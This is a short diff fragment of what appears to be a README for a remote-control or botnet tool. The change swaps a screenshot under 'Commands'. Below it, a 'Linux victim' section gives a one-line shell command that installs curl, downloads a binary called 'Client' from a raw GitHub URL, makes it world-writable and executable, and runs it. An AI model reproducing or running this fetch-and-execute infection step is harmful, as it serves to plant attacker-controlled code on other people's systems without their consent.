@@ -21,7 +21,7 @@ bnt: @udbnt
 * ?
 
 # Commands
-![image](https://user-images.githubusercontent.com/104208624/203849645-908bde50-bd0a-49fa-9a8a-1f948953677e.png)
+![image](https://user-images.githubusercontent.com/104208624/204051770-4654a49d-2319-4785-a005-f494c7ba18aa.png)
 
 # Linux victim
 cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
